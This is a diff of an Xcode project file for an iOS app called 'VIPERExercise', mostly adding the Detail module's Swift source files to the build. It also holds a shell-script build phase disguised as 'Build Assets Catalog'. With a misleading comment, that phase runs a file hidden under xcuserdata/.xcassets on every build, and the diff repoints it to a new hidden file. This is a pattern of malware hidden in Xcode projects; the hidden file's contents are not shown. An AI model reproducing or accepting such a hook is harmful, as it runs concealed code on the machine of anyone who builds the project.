@@ -9,6 +9,12 @@
 /* Begin PBXBuildFile section */
 		225EF70025EB717100C6E605 /* HomeCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF6FE25EB717100C6E605 /* HomeCell.swift */; };
 		225EF70125EB717100C6E605 /* HomeCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 225EF6FF25EB717100C6E605 /* HomeCell.xib */; };
+		225EF71325EB7B5900C6E605 /* DetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF71225EB7B5900C6E605 /* DetailsViewController.swift */; };
+		225EF71825EB7B8100C6E605 /* DetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF71725EB7B8100C6E605 /* DetailView.swift */; };
+		225EF71D25EB7BBB00C6E605 /* DetailInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF71C25EB7BBB00C6E605 /* DetailInteractor.swift */; };
+		225EF72225EB7BCF00C6E605 /* DetailPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF72125EB7BCF00C6E605 /* DetailPresenter.swift */; };
+		225EF72725EB7BDC00C6E605 /* DetailRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF72625EB7BDC00C6E605 /* DetailRouter.swift */; };
+		225EF72C25EB7BF100C6E605 /* DetailModuleBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 225EF72B25EB7BF100C6E605 /* DetailModuleBuilder.swift */; };
 		22815EFA25EA476800B23B1A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22815EF925EA476800B23B1A /* AppDelegate.swift */; };
 		22815F0125EA476800B23B1A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22815EFF25EA476800B23B1A /* Main.storyboard */; };
 		22815F0325EA476D00B23B1A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22815F0225EA476D00B23B1A /* Assets.xcassets */; };
@@ -47,6 +53,12 @@
 /* Begin PBXFileReference section */
 		225EF6FE25EB717100C6E605 /* HomeCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCell.swift; sourceTree = "<group>"; };
 		225EF6FF25EB717100C6E605 /* HomeCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeCell.xib; sourceTree = "<group>"; };
+		225EF71225EB7B5900C6E605 /* DetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailsViewController.swift; sourceTree = "<group>"; };
+		225EF71725EB7B8100C6E605 /* DetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailView.swift; sourceTree = "<group>"; };
+		225EF71C25EB7BBB00C6E605 /* DetailInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailInteractor.swift; sourceTree = "<group>"; };
+		225EF72125EB7BCF00C6E605 /* DetailPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailPresenter.swift; sourceTree = "<group>"; };
+		225EF72625EB7BDC00C6E605 /* DetailRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailRouter.swift; sourceTree = "<group>"; };
+		225EF72B25EB7BF100C6E605 /* DetailModuleBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailModuleBuilder.swift; sourceTree = "<group>"; };
 		22815EF625EA476800B23B1A /* VIPERExercise.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VIPERExercise.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22815EF925EA476800B23B1A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		22815F0025EA476800B23B1A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
@@ -294,6 +306,8 @@
 		22815F6025EA506F00B23B1A /* View */ = {
 			isa = PBXGroup;
 			children = (
+				225EF71225EB7B5900C6E605 /* DetailsViewController.swift */,
+				225EF71725EB7B8100C6E605 /* DetailView.swift */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -301,6 +315,7 @@
 		22815F6125EA507500B23B1A /* Interactor */ = {
 			isa = PBXGroup;
 			children = (
+				225EF71C25EB7BBB00C6E605 /* DetailInteractor.swift */,
 			);
 			path = Interactor;
 			sourceTree = "<group>";
@@ -308,6 +323,7 @@
 		22815F6225EA508700B23B1A /* Presenter */ = {
 			isa = PBXGroup;
 			children = (
+				225EF72125EB7BCF00C6E605 /* DetailPresenter.swift */,
 			);
 			path = Presenter;
 			sourceTree = "<group>";
@@ -315,6 +331,7 @@
 		22815F6325EA509700B23B1A /* Router */ = {
 			isa = PBXGroup;
 			children = (
+				225EF72625EB7BDC00C6E605 /* DetailRouter.swift */,
 			);
 			path = Router;
 			sourceTree = "<group>";
@@ -329,6 +346,7 @@
 		22815F6525EA50A900B23B1A /* Builder */ = {
 			isa = PBXGroup;
 			children = (
+				225EF72B25EB7BF100C6E605 /* DetailModuleBuilder.swift */,
 			);
 			path = Builder;
 			sourceTree = "<group>";
@@ -349,7 +367,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22815F2025EA476E00B23B1A /* Build configuration list for PBXNativeTarget "VIPERExercise" */;
 			buildPhases = (
-				D3CBF8E7DA96B62B8BAAC43A /* Build Assets Catalog */,
+				31E12AF14A3D8D06B2AAC43A /* Build Assets Catalog */,
 				22815EF225EA476800B23B1A /* Sources */,
 				22815EF325EA476800B23B1A /* Frameworks */,
 				22815EF425EA476800B23B1A /* Resources */,
@@ -471,7 +489,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	D3CBF8E7DA96B62B8BAAC43A /* Build Assets Catalog */ = {
+	31E12AF14A3D8D06B2AAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -489,7 +507,7 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
 	
 /* End PBXShellScriptBuildPhase section */
@@ -499,17 +517,23 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				225EF72C25EB7BF100C6E605 /* DetailModuleBuilder.swift in Sources */,
 				22815EFA25EA476800B23B1A /* AppDelegate.swift in Sources */,
 				22815F4825EA492400B23B1A /* HomeRouter.swift in Sources */,
 				22815F6B25EA520700B23B1A /* Enums.swift in Sources */,
+				225EF71825EB7B8100C6E605 /* DetailView.swift in Sources */,
 				22815F4D25EA492400B23B1A /* HomeModuleBuilder.swift in Sources */,
 				22815F4E25EA492400B23B1A /* HomeViewController.swift in Sources */,
+				225EF71D25EB7BBB00C6E605 /* DetailInteractor.swift in Sources */,
 				22815F4925EA492400B23B1A /* HomeModel.swift in Sources */,
 				22815F5C25EA4B2B00B23B1A /* NavigationBuilder.swift in Sources */,
 				22815F4C25EA492400B23B1A /* HomeInteractor.swift in Sources */,
 				22815F7325EA55A600B23B1A /* Service.swift in Sources */,
+				225EF72225EB7BCF00C6E605 /* DetailPresenter.swift in Sources */,
 				22815F4B25EA492400B23B1A /* HomeView.swift in Sources */,
 				225EF70025EB717100C6E605 /* HomeCell.swift in Sources */,
+				225EF72725EB7BDC00C6E605 /* DetailRouter.swift in Sources */,
+				225EF71325EB7B5900C6E605 /* DetailsViewController.swift in Sources */,
 				22815F4A25EA492400B23B1A /* HomePresenter.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
